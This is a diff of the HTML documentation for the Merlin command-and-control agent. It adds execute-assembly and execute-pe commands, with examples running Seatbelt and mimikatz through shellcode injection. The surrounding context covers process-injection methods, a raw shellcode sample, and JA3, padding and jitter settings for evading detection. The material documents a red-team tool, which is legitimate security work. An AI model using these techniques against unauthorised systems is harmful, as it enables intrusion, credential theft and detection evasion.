@@ -1,7 +1,7 @@
 
 
 <!DOCTYPE html>
-<html class="writer-html5" lang="en" >
+<html class="writer-html4" lang="en" >
 <head>
   <meta charset="utf-8">
   
@@ -26,10 +26,10 @@
   
     
       <script type="text/javascript" id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
-        <script src="../../_static/jquery.js"></script>
-        <script src="../../_static/underscore.js"></script>
-        <script src="../../_static/doctools.js"></script>
-        <script src="../../_static/language_data.js"></script>
+        <script type="text/javascript" src="../../_static/jquery.js"></script>
+        <script type="text/javascript" src="../../_static/underscore.js"></script>
+        <script type="text/javascript" src="../../_static/doctools.js"></script>
+        <script type="text/javascript" src="../../_static/language_data.js"></script>
     
     <script type="text/javascript" src="../../_static/js/theme.js"></script>
 
@@ -110,6 +110,8 @@
 <li class="toctree-l2"><a class="reference internal" href="#back">back</a></li>
 <li class="toctree-l2"><a class="reference internal" href="#download">download</a></li>
 <li class="toctree-l2"><a class="reference internal" href="#exit">exit</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#execute-assembly">execute-assembly</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#execute-pe">execute-pe</a></li>
 <li class="toctree-l2"><a class="reference internal" href="#execute-shellcode">execute-shellcode</a><ul>
 <li class="toctree-l3"><a class="reference internal" href="#self">self</a></li>
 <li class="toctree-l3"><a class="reference internal" href="#remote">remote</a></li>
@@ -234,6 +236,13 @@
                     | (DEPRECIATED)                  |
   back              | Return to the main menu        |
   download          | Download a file from the agent | download &lt;remote_file&gt;
+  execute-assembly  | Execute a .NET 4.0 assembly    | execute-assembly &lt;assembly
+                    |                                | path&gt; [&lt;assembly args&gt;,
+                    |                                | &lt;spawnto path&gt;, &lt;spawnto
+                    |                                | args&gt;]
+  execute-pe        | Execute a Windows PE (EXE)     | execute-pe &lt;pe path&gt;
+                    |                                | [&lt;pe args&gt;, &lt;spawnto
+                    |                                | path&gt;, &lt;spawnto args&gt;]
   execute-shellcode | Execute shellcode              | self, remote &lt;pid&gt;,
                     |                                | RtlCreateUserThread &lt;pid&gt;
   info              | Display all information about  |
@@ -259,7 +268,7 @@ Agent Help Menu
 </div>
 <div class="section" id="cd">
 <h2>cd<a class="headerlink" href="#cd" title="Permalink to this headline">¶</a></h2>
-<p>The <code class="docutils literal notranslate"><span class="pre">cd</span></code> command is used to change the current working directory the Merlin agent is using. Relative paths can be used (i.e. <code class="docutils literal notranslate"><span class="pre">./../</span></code> or <code class="docutils literal notranslate"><span class="pre">downloads\\Merlin</span></code>). This command uses native Go and will not execute the <code class="docutils literal notranslate"><span class="pre">cd</span></code> binary program found on the host operating system.</p>
+<p>The <code class="docutils literal notranslate"><span class="pre">cd</span></code> command is used to change the current working directory the Merlin agent is using. Relative paths can be used (e.g.,. <code class="docutils literal notranslate"><span class="pre">./../</span></code> or <code class="docutils literal notranslate"><span class="pre">downloads\\Merlin</span></code>). This command uses native Go and will not execute the <code class="docutils literal notranslate"><span class="pre">cd</span></code> binary program found on the host operating system.</p>
 <div class="line-block">
 <div class="line">The <code class="docutils literal notranslate"><span class="pre">\</span></code> in a Windows directory must be escaped like <code class="docutils literal notranslate"><span class="pre">C:\\Windows\\System32</span></code>.</div>
 </div>
@@ -291,8 +300,8 @@ Merlin»
 <div class="section" id="download">
 <h2>download<a class="headerlink" href="#download" title="Permalink to this headline">¶</a></h2>
 <p>The <code class="docutils literal notranslate"><span class="pre">download</span></code> command is used to download a file from the host where the agent is running back to the Merlin server. The file will be automatically saved in a folder with a name of the agent’s identifier in the <cite>dataagentsc1090dbc-f2f7-4d90-a241-86e0c0217786</cite> directory.</p>
-<p><strong>NOTE:</strong> Because <code class="docutils literal notranslate"><span class="pre">\</span></code> is used to escape a character, file paths require two (i.e <code class="docutils literal notranslate"><span class="pre">C:\\Windows</span></code>)</p>
-<p><strong>NOTE:</strong> Enclose file paths containing a space with quotation marks (i.e. <code class="docutils literal notranslate"><span class="pre">&quot;C:\\Windows\\Program</span> <span class="pre">Files\\&quot;</span></code>)</p>
+<p><strong>NOTE:</strong> Because <code class="docutils literal notranslate"><span class="pre">\</span></code> is used to escape a character, file paths require two (e.g., <code class="docutils literal notranslate"><span class="pre">C:\\Windows</span></code>)</p>
+<p><strong>NOTE:</strong> Enclose file paths containing a space with quotation marks (e.g.,. <code class="docutils literal notranslate"><span class="pre">&quot;C:\\Windows\\Program</span> <span class="pre">Files\\&quot;</span></code>)</p>
 <div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» download C:\\Windows\\hh.exe
 Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job NXnhJVRUSP for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
 [+]Results for job NXnhJVRUSP
@@ -312,32 +321,128 @@ yes
 </pre></div>
 </div>
 </div>
+<div class="section" id="execute-assembly">
+<h2>execute-assembly<a class="headerlink" href="#execute-assembly" title="Permalink to this headline">¶</a></h2>
+<p>The <code class="docutils literal notranslate"><span class="pre">execute-assembly</span></code> command uses <a class="reference external" href="https://github.com/Binject/go-donut">go-donut</a> to convert a .NET assembly into shellcode and then uses the <code class="docutils literal notranslate"><span class="pre">windows/x64/go/exec/createProcess</span></code> Merlin module to execute the shellcode.</p>
+<p>Currently this command only supports .NET v4.0 assemblies. For more granular control, use the <code class="docutils literal notranslate"><span class="pre">windows/x64/go/exec/donut</span></code> module.</p>
+<p>The command is executed as: <code class="docutils literal notranslate"><span class="pre">execute-assembly</span> <span class="pre">&lt;assembly</span> <span class="pre">path&gt;</span> <span class="pre">[&lt;assembly</span> <span class="pre">args&gt;</span> <span class="pre">&lt;spawnto</span> <span class="pre">path&gt;</span> <span class="pre">&lt;spawnto</span> <span class="pre">args&gt;]</span></code></p>
+<p>The command requires the file path to the assembly you wish to execute in the <code class="docutils literal notranslate"><span class="pre">&lt;assembly</span> <span class="pre">path&gt;</span></code> argument. All other arguments are optional. The <code class="docutils literal notranslate"><span class="pre">&lt;spawnto</span> <span class="pre">path&gt;</span></code> argument is the process that will be started on the target and where the shellcode will be injected and executed. If a <code class="docutils literal notranslate"><span class="pre">&lt;spawnto</span> <span class="pre">path&gt;</span></code> is not provided, <code class="docutils literal notranslate"><span class="pre">C:\WIndows\System32\dllhost.exe</span></code> will be used. The <code class="docutils literal notranslate"><span class="pre">&lt;spawnto</span> <span class="pre">args&gt;</span></code> value is used as an argument when starting the spawnto process.</p>
+<p><strong>NOTE:</strong> Because <code class="docutils literal notranslate"><span class="pre">\</span></code> is used to escape a character, file paths require two (e.g., <code class="docutils literal notranslate"><span class="pre">C:\\Windows</span></code>)</p>
+<p><strong>NOTE:</strong> Use quotes to enclose multiple arguments for <code class="docutils literal notranslate"><span class="pre">&lt;assembly</span> <span class="pre">args&gt;</span></code> (e.g., <code class="docutils literal notranslate"><span class="pre">execute-assembly</span> <span class="pre">Seatbelt.exe</span> <span class="pre">&quot;LocalGroups</span> <span class="pre">LocalUsers&quot;</span></code>)</p>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-assembly Seatbelt.exe &quot;DotNet IdleTime&quot; &quot;C:\\Windows\\System32\\WerFault.exe&quot; /?
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
+[-] Created job dmAfzDPUsM for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+
+[+] Results for c1090dbc-f2f7-4d90-a241-86e0c0217786 job dmAfzDPUsM
+
+
+
+                        %&amp;&amp;@@@&amp;&amp;
+                        &amp;&amp;&amp;&amp;&amp;&amp;&amp;%%%,                       #&amp;&amp;@@@@@@%%%%%%###############%
+                        &amp;%&amp;   %&amp;%%                        &amp;////(((&amp;%%%%%#%################//((((###%%%%%%%%%%%%%%%
+%%%%%%%%%%%######%%%#%%####%  &amp;%%**#                      @////(((&amp;%%%%%%######################(((((((((((((((((((
+#%#%%%%%%%#######%#%%#######  %&amp;%,,,,,,,,,,,,,,,,         @////(((&amp;%%%%%#%#####################(((((((((((((((((((
+#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&amp;%%%%%%%######################(#(((#(#((((((((((
+#####%%%####################  &amp;%%......  ...   ..         @////(((&amp;%%%%%%%###############%######((#(#(####((((((((
+#######%##########%#########  %%%......  ...   ..         @////(((&amp;%%%%%#########################(#(#######((#####
+###%##%%####################  &amp;%%...............          @////(((&amp;%%%%%%%%##############%#######(#########((#####
+#####%######################  %%%..                       @////(((&amp;%%%%%%%################
+                        &amp;%&amp;   %%%%%      Seatbelt         %////(((&amp;%%%%%%%%#############*
+                        &amp;%%&amp;&amp;&amp;%%%%%        v1.1.0         ,(((&amp;%%%%%%%%%%%%%%%%%,
+                         #%%%%##,
+
+
+====== DotNet ======
+
+  Installed CLR Versions
+      2.0.50727
+      4.0.30319
+
+  Installed .NET Versions
+      3.5.30729.4926
+      4.8.03752
+
+  Anti-Malware Scan Interface (AMSI)
+      OS supports AMSI           : True
+     .NET version support AMSI   : True
+        [!] The highest .NET version is enrolled in AMSI!
+        [*] You can invoke .NET version 3.5 to bypass AMSI.
+====== IdleTime ======
+
+  CurrentUser : DESKTOP-H35RK21\rastley
+  Idletime    : 00h:06m:02s:766ms (362766 milliseconds)
+
+
+
+[*] Completed collection in 0.122 seconds
+</pre></div>
+</div>
+</div>
+<div class="section" id="execute-pe">
+<h2>execute-pe<a class="headerlink" href="#execute-pe" title="Permalink to this headline">¶</a></h2>
+<p>The <code class="docutils literal notranslate"><span class="pre">execute-pe</span></code> command uses <a class="reference external" href="https://github.com/Binject/go-donut">go-donut</a> to convert a Windows Portable Executable (PE), commonly an .exe, into shellcode and then uses the <code class="docutils literal notranslate"><span class="pre">windows/x64/go/exec/createProcess</span></code> Merlin module to execute the shellcode.</p>
+<p>The command is executed as: <code class="docutils literal notranslate"><span class="pre">execute-pe</span> <span class="pre">&lt;assembly</span> <span class="pre">path&gt;</span> <span class="pre">[&lt;assembly</span> <span class="pre">args&gt;</span> <span class="pre">&lt;spawnto</span> <span class="pre">path&gt;</span> <span class="pre">&lt;spawnto</span> <span class="pre">args&gt;]</span></code></p>
+<p>The command requires the file path to the PE you wish to execute in the <code class="docutils literal notranslate"><span class="pre">&lt;pe</span> <span class="pre">path&gt;</span></code> argument. All other arguments are optional. The <code class="docutils literal notranslate"><span class="pre">&lt;spawnto</span> <span class="pre">path&gt;</span></code> argument is the process that will be started on the target and where the shellcode will be injected and executed. If a <code class="docutils literal notranslate"><span class="pre">&lt;spawnto</span> <span class="pre">path&gt;</span></code> is not provided, <code class="docutils literal notranslate"><span class="pre">C:\WIndows\System32\dllhost.exe</span></code> will be used. The <code class="docutils literal notranslate"><span class="pre">&lt;spawnto</span> <span class="pre">args&gt;</span></code> value is used as an argument when starting the spawnto process.</p>
+<p><strong>NOTE:</strong> Because <code class="docutils literal notranslate"><span class="pre">\</span></code> is used to escape a character, file paths require two (e.g., <code class="docutils literal notranslate"><span class="pre">C:\\Windows</span></code>)</p>
+<p><strong>NOTE:</strong> Use quotes to enclose multiple arguments for <code class="docutils literal notranslate"><span class="pre">&lt;pe</span> <span class="pre">args&gt;</span></code> (e.g., <code class="docutils literal notranslate"><span class="pre">execute-pe</span> <span class="pre">mimikatz.exe</span> <span class="pre">&quot;coffee</span> <span class="pre">exit&quot;</span></code>)</p>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-pe mimikatz.exe &quot;coffee exit&quot; C:\\Windows\\System32\\WerFault.exe Testing
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
+[-] Created job BSvJZFvbRZ for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+
+[+] Results for c1090dbc-f2f7-4d90-a241-86e0c0217786 job BSvJZFvbRZ
+
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
+ .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # coffee
+
+    ( (
+     ) )
+  .______.
+  |      |]
+  \      /
+   `----&#39;
+
+mimikatz(commandline) # exit
+Bye!
+</pre></div>
+</div>
+</div>
 <div class="section" id="execute-shellcode">
 <h2>execute-shellcode<a class="headerlink" href="#execute-shellcode" title="Permalink to this headline">¶</a></h2>
 <p>The <code class="docutils literal notranslate"><span class="pre">execute-shellcode</span></code> command is used to have the Agent execute the provided shellcode. This command became available in version <code class="docutils literal notranslate"><span class="pre">0.6.4</span></code> and is only supported for Windows agents.</p>
-<dl class="simple">
-<dt>The <code class="docutils literal notranslate"><span class="pre">execute-shellcode</span></code> command takes the shellcode you want to execute at the last argument. Shellcode can be provided using an absolute filepath or by pasting it directly into the terminal in one of the following formats:</dt><dd><ul class="simple">
-<li><p>Hex (i.e. <cite>5051525356</cite>)</p></li>
-<li><p><code class="docutils literal notranslate"><span class="pre">0x50,</span> <span class="pre">0x51,</span> <span class="pre">0x52,</span> <span class="pre">0x53,</span> <span class="pre">0x56</span></code> with or without spaces and commas</p></li>
-<li><p><code class="docutils literal notranslate"><span class="pre">\x50\x51\x52\x53\x56</span></code></p></li>
-<li><p>Base64 encoded version of the above formats</p></li>
-<li><p>A file containing any of the above formats or just a raw byte file</p></li>
+<dl class="docutils">
+<dt>The <code class="docutils literal notranslate"><span class="pre">execute-shellcode</span></code> command takes the shellcode you want to execute at the last argument. Shellcode can be provided using an absolute filepath or by pasting it directly into the terminal in one of the following formats:</dt>
+<dd><ul class="first last simple">
+<li>Hex (e.g.,. <cite>5051525356</cite>)</li>
+<li><code class="docutils literal notranslate"><span class="pre">0x50,</span> <span class="pre">0x51,</span> <span class="pre">0x52,</span> <span class="pre">0x53,</span> <span class="pre">0x56</span></code> with or without spaces and commas</li>
+<li><code class="docutils literal notranslate"><span class="pre">\x50\x51\x52\x53\x56</span></code></li>
+<li>Base64 encoded version of the above formats</li>
+<li>A file containing any of the above formats or just a raw byte file</li>
 </ul>
 </dd>
 </dl>
 <p><strong>WARNING</strong> Shellcode injection and execution could cause a process to crash so choose wisely</p>
 <p><strong>NOTE</strong> If Cobalt Strike’s Beacon is injected using one of these methods, exiting the Beacon will cause the process to die too.</p>
-<dl class="simple">
-<dt>The agent can execute shellcode using one of the following methods:</dt><dd><ul class="simple">
-<li><p><a class="reference internal" href="#self">self</a></p></li>
-<li><p><a class="reference internal" href="#remote">remote</a></p></li>
-<li><p><a class="reference internal" href="#rtlcreateuserthread">RtlCreateUserThread</a></p></li>
-<li><p><a class="reference internal" href="#id3">UserAPC</a></p></li>
+<dl class="docutils">
+<dt>The agent can execute shellcode using one of the following methods:</dt>
+<dd><ul class="first last simple">
+<li><a class="reference internal" href="#self">self</a></li>
+<li><a class="reference internal" href="#remote">remote</a></li>
+<li><a class="reference internal" href="#rtlcreateuserthread">RtlCreateUserThread</a></li>
+<li><a class="reference internal" href="#id4">UserAPC</a></li>
 </ul>
 </dd>
 </dl>
 <div class="section" id="self">
-<span id="id1"></span><h3>self<a class="headerlink" href="#self" title="Permalink to this headline">¶</a></h3>
+<span id="id2"></span><h3>self<a class="headerlink" href="#self" title="Permalink to this headline">¶</a></h3>
 <p>The <code class="docutils literal notranslate"><span class="pre">self</span></code> method allocates space within the Merlin Agent process and executes the shellcode.</p>
 <p>Syntax is <code class="docutils literal notranslate"><span class="pre">execute-shellcode</span> <span class="pre">self</span> <span class="pre">&lt;SHELLCODE&gt;</span></code></p>
 <div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode self 505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3
@@ -359,7 +464,7 @@ Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job PRumZQY
 </div>
 </div>
 <div class="section" id="rtlcreateuserthread">
-<span id="id2"></span><h3>RtlCreateUserThread<a class="headerlink" href="#rtlcreateuserthread" title="Permalink to this headline">¶</a></h3>
+<span id="id3"></span><h3>RtlCreateUserThread<a class="headerlink" href="#rtlcreateuserthread" title="Permalink to this headline">¶</a></h3>
 <p>The <code class="docutils literal notranslate"><span class="pre">rtlcreateuserthread</span></code> method creates a thread in another process using the undocumented <a class="reference external" href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FRtlCreateUserThread.html">RtlCreateUserThread</a> Windows API call.</p>
 <p>Syntax is <code class="docutils literal notranslate"><span class="pre">execute-shellcode</span> <span class="pre">rtlcreateuserthread</span> <span class="pre">&lt;PID&gt;</span> <span class="pre">&lt;SHELLCODE&gt;</span></code> where PID is the Process ID you want to execute the shellcode under.</p>
 <p>Example:</p>
@@ -372,7 +477,7 @@ Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job CCWrmdL
 </div>
 <div class="section" id="userapc">
 <h3>UserAPC<a class="headerlink" href="#userapc" title="Permalink to this headline">¶</a></h3>
-<p id="id3">The <code class="docutils literal notranslate"><span class="pre">userapc</span></code> method creates a thread in another process using the <a class="reference external" href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-queueuserapc">QueueUserAPC</a> Windows API call.</p>
+<p id="id4">The <code class="docutils literal notranslate"><span class="pre">userapc</span></code> method creates a thread in another process using the <a class="reference external" href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-queueuserapc">QueueUserAPC</a> Windows API call.</p>
 <p>Syntax is <code class="docutils literal notranslate"><span class="pre">execute-shellcode</span> <span class="pre">userapc</span> <span class="pre">&lt;PID&gt;</span> <span class="pre">&lt;SHELLCODE&gt;</span></code> where PID is the Process ID you want to execute the shellcode under.</p>
 <p><strong>NOTE:</strong> This method is highly unstable and therefore was intentionally not added to the tab completion list of available methods. The current implementation requires the process to have more than 1 thread. All remaining threads will have a user-mode APC queued to execute the shellcode and could result in multiple instances of execution. This method frequently causes processes to crash. Additionally, the shellcode might not execute at all if none of the threads were in an alertable state. The <cite>svchost.exe</cite> process usually provides a little better choice, but still not guaranteed.</p>
 <div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode userapc 4824 /home/rickastley/calc.bin
@@ -425,7 +530,7 @@ Merlin» [-]Created job goaRNhTVTT for agent c1090dbc-f2f7-4d90-a241-86e0c021778
 </div>
 <div class="section" id="ls">
 <h2>ls<a class="headerlink" href="#ls" title="Permalink to this headline">¶</a></h2>
-<p>The <code class="docutils literal notranslate"><span class="pre">ls</span></code> command is used to list a directory’s contents using native Go functions within Merlin. This command will not execute the <code class="docutils literal notranslate"><span class="pre">ls</span></code> or <code class="docutils literal notranslate"><span class="pre">dir</span></code> binary programs found on their associated host operating systems. If a directory is not specified, Merlin will list the contents of the current working directory. When specifying a Windows path, you must escape the backslash (i.e. <cite>C:\Temp</cite>). Wrap file paths containing a space in quotations. Alternatively, Linux file paths with a space can be called without quotes by escaping the space (i.e. <code class="docutils literal notranslate"><span class="pre">/root/some\</span> <span class="pre">folder/</span></code>). Relative paths can be used (i.e. <code class="docutils literal notranslate"><span class="pre">./../</span></code> or <code class="docutils literal notranslate"><span class="pre">downloads\\Merlin</span></code>) and they are resolved to their absolute path.</p>
+<p>The <code class="docutils literal notranslate"><span class="pre">ls</span></code> command is used to list a directory’s contents using native Go functions within Merlin. This command will not execute the <code class="docutils literal notranslate"><span class="pre">ls</span></code> or <code class="docutils literal notranslate"><span class="pre">dir</span></code> binary programs found on their associated host operating systems. If a directory is not specified, Merlin will list the contents of the current working directory. When specifying a Windows path, you must escape the backslash (e.g.,. <cite>C:\Temp</cite>). Wrap file paths containing a space in quotations. Alternatively, Linux file paths with a space can be called without quotes by escaping the space (e.g.,. <code class="docutils literal notranslate"><span class="pre">/root/some\</span> <span class="pre">folder/</span></code>). Relative paths can be used (e.g.,. <code class="docutils literal notranslate"><span class="pre">./../</span></code> or <code class="docutils literal notranslate"><span class="pre">downloads\\Merlin</span></code>) and they are resolved to their absolute path.</p>
 <div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» ls /var
 [-]Created job eNJKIiLXXH for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
 Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job eNJKIiLXXH
@@ -477,17 +582,17 @@ drwxrwxrwx      2018-09-15 00:42:33     0       windows nt
 <h2>set<a class="headerlink" href="#set" title="Permalink to this headline">¶</a></h2>
 <p>The <code class="docutils literal notranslate"><span class="pre">set</span></code> command is used to provide the agent with instructions on controlling itself and/or its configuration. There are several control types to include:</p>
 <ul class="simple">
-<li><p><a class="reference internal" href="#ja3">ja3</a></p></li>
-<li><p><a class="reference internal" href="#killdate">killdate</a></p></li>
-<li><p><a class="reference internal" href="#maxretry">maxretry</a></p></li>
-<li><p><a class="reference internal" href="#padding">padding</a></p></li>
-<li><p><a class="reference internal" href="#skew">skew</a></p></li>
-<li><p><a class="reference internal" href="#sleep">sleep</a></p></li>
+<li><a class="reference internal" href="#ja3">ja3</a></li>
+<li><a class="reference internal" href="#killdate">killdate</a></li>
+<li><a class="reference internal" href="#maxretry">maxretry</a></li>
+<li><a class="reference internal" href="#padding">padding</a></li>
+<li><a class="reference internal" href="#skew">skew</a></li>
+<li><a class="reference internal" href="#sleep">sleep</a></li>
 </ul>
 <div class="section" id="ja3">
-<span id="id4"></span><h3>ja3<a class="headerlink" href="#ja3" title="Permalink to this headline">¶</a></h3>
+<span id="id5"></span><h3>ja3<a class="headerlink" href="#ja3" title="Permalink to this headline">¶</a></h3>
 <p><a class="reference external" href="https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967">JA3 is a method for fingerprinting TLS clients on the wire</a>. Every TLS client has a unique signature depending on its configuration of the following TLS options: <code class="docutils literal notranslate"><span class="pre">SSLVersion,Ciphers,Extensions,EllipticCurves,EllipticCurvePointFormats</span></code>.</p>
-<p>The <code class="docutils literal notranslate"><span class="pre">ja3</span></code> option allows the agent to create a TLS client based on the provided JA3 hash signature. This is useful to evade detections based on a JA3 hash for a known tool (i.e. Merlin). <a class="reference external" href="https://engineering.salesforce.com/gquic-protocol-analysis-and-fingerprinting-in-zeek-a4178855d75f">This</a> article documents a JA3 fingerprint for Merlin. Known JA3 signatures can be downloaded from <a class="reference external" href="https://ja3er.com/">https://ja3er.com/</a></p>
+<p>The <code class="docutils literal notranslate"><span class="pre">ja3</span></code> option allows the agent to create a TLS client based on the provided JA3 hash signature. This is useful to evade detections based on a JA3 hash for a known tool (e.g.,. Merlin). <a class="reference external" href="https://engineering.salesforce.com/gquic-protocol-analysis-and-fingerprinting-in-zeek-a4178855d75f">This</a> article documents a JA3 fingerprint for Merlin. Known JA3 signatures can be downloaded from <a class="reference external" href="https://ja3er.com/">https://ja3er.com/</a></p>
 <p><strong>NOTE:</strong> Make sure the input JA3 hash will enable communications with the Server. For example, if you leverage a JA3 hash that only supports SSLv2 and the server does not support that protocol, then they will not be able to communicate. The <code class="docutils literal notranslate"><span class="pre">-ja3</span></code> flag will override the the <code class="docutils literal notranslate"><span class="pre">-proto</span></code> flag and will cause the agent to use the protocol provided in the JA3 hash.</p>
 <p>This example will create a TLS client with a JA3 hash of <code class="docutils literal notranslate"><span class="pre">51a7ad14509fd614c7bb3a50c4982b8c</span></code> that matches Java based malware such as Neutrino and Nuclear Exploit Kit (EK).</p>
 <div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set ja3 769,49161-49171-47-49156-49166-51-50-49159-49169-5-49154-49164-49160-49170-10-49155-49165-22-19-4-255,10-11-0,23-1-3-19-21-6-7-9-10-24-11-12-25-13-14-15-16-17-2-18-4-5-20-8-22,0
@@ -497,7 +602,7 @@ Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
 </div>
 </div>
 <div class="section" id="killdate">
-<span id="id5"></span><h3>killdate<a class="headerlink" href="#killdate" title="Permalink to this headline">¶</a></h3>
+<span id="id6"></span><h3>killdate<a class="headerlink" href="#killdate" title="Permalink to this headline">¶</a></h3>
 <p>Killdate is a UNIX timestamp that denotes a time the executable will not run after (if it is 0 it will not be used). Killdate is checked before the agent performs each checkin, including before the initial checkin.</p>
 <p>Killdate can be set in the agent/agent.go file before compiling, in the New function instantiation of a new agent. One scenario for using the killdate feature is an agent is persisted as a service and you want it to stop functioning after a certain date, in case the target organization fails to remediate the malicious service. Using killdate here would stop the agent from functioning after a certain specified UNIX system time.</p>
 <p>The Killdate can also be set or changed for running agents using the <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">killdate</span></code> command from the agent menu. This will only modify the killdate for the running agent in memory and will not update the compiled binary file. <a class="reference external" href="http://unixtimestamp.50x.eu/">http://unixtimestamp.50x.eu/</a> can be used to generate a UNIX timestamp.</p>
@@ -508,7 +613,7 @@ Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job utpISXXXbl 
 </div>
 </div>
 <div class="section" id="maxretry">
-<span id="id6"></span><h3>maxretry<a class="headerlink" href="#maxretry" title="Permalink to this headline">¶</a></h3>
+<span id="id7"></span><h3>maxretry<a class="headerlink" href="#maxretry" title="Permalink to this headline">¶</a></h3>
 <p>The <code class="docutils literal notranslate"><span class="pre">maxretry</span></code> control type is used to change the _maximum_ number of failed login an agent will allow before the agent quits. For the sake of this conversation, a login means establishing contact with a Merlin Server and receiving no errors. The default is 7. There is no response on the CLI after the instruction has been provided to the agent. You can verify the setting was changed using the <code class="docutils literal notranslate"><span class="pre">agent</span> <span class="pre">info</span></code> command.</p>
 <div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set maxretry 50
 Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job utpISXXXbl for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
@@ -516,7 +621,7 @@ Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job utpISXXXbl 
 </div>
 </div>
 <div class="section" id="padding">
-<span id="id7"></span><h3>padding<a class="headerlink" href="#padding" title="Permalink to this headline">¶</a></h3>
+<span id="id8"></span><h3>padding<a class="headerlink" href="#padding" title="Permalink to this headline">¶</a></h3>
 <p>The <code class="docutils literal notranslate"><span class="pre">padding</span></code> control type is used to change the _maximum_ size of a message’s padding. A random value between 0 and the maximum padding value is selected on a per message basis and added to the end of each message. This is used in an attempt to evade detection when a program looks for messages with same size beaconing out. The default is 4096. There is no response on the CLI after the instruction has been provided to the agent. You can verify the setting was changed using the <code class="docutils literal notranslate"><span class="pre">agent</span> <span class="pre">info</span></code> command.</p>
 <div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set padding 8192
 Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job wlGTwgtqNx for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
@@ -524,7 +629,7 @@ Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job wlGTwgtqNx 
 </div>
 </div>
 <div class="section" id="skew">
-<span id="id8"></span><h3>skew<a class="headerlink" href="#skew" title="Permalink to this headline">¶</a></h3>
+<span id="id9"></span><h3>skew<a class="headerlink" href="#skew" title="Permalink to this headline">¶</a></h3>
 <p>The <code class="docutils literal notranslate"><span class="pre">skew</span></code> command is used to introduce a jitter or skew to the agent sleep time to keep traffic from occurring at exact time intervals.</p>
 <div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set skew 5
 Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job lyYQdxckTY for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
@@ -533,7 +638,7 @@ Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
 </div>
 </div>
 <div class="section" id="sleep">
-<span id="id9"></span><h3>sleep<a class="headerlink" href="#sleep" title="Permalink to this headline">¶</a></h3>
+<span id="id10"></span><h3>sleep<a class="headerlink" href="#sleep" title="Permalink to this headline">¶</a></h3>
 <p>The <code class="docutils literal notranslate"><span class="pre">sleep</span></code> control type is used to change the amount of time that an agent will sleep before checking in again. The default is 30 seconds. The values provided to this command are written in a time format. For example, <code class="docutils literal notranslate"><span class="pre">30s</span></code> is 30 seconds and <code class="docutils literal notranslate"><span class="pre">60m</span></code> is 60 minutes. There is no response on the CLI after the instruction has been provided to the agent. You can verify the setting was changed using the <code class="docutils literal notranslate"><span class="pre">agent</span> <span class="pre">info</span></code> command.</p>
 <div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set sleep 15s
